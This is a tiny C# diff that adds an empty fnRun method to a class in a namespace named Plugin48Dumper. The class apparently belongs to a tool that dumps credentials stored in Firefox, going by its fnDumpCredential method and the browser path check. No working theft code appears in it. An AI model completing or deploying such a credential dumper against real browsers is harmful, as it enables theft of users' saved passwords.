@@ -38,6 +38,11 @@ namespace Plugin48Dumper
             Available = Directory.Exists(m_szFirefoxPath);
         }
 
+        public override void fnRun(List<string> lsArgs)
+        {
+
+        }
+
         public List<clsCredential> fnDumpCredential(int nCount = 100, string szRegex = "")
         {
             List<clsCredential> ls = new List<clsCredential>();
